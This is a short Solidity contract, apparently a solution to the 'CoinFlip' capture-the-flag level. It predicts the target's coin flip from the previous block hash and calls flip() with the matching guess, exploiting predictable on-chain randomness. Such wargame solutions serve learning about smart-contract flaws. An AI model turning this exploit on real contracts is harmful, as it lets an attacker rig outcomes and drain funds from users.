pragma solidity 0.8.13;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipChallenge {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip coinFlipChallenge;

    constructor(address _coinFlip) {
        coinFlipChallenge = ICoinFlip(_coinFlip);
    }

    function guess() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return coinFlipChallenge.flip(side);
    }
}
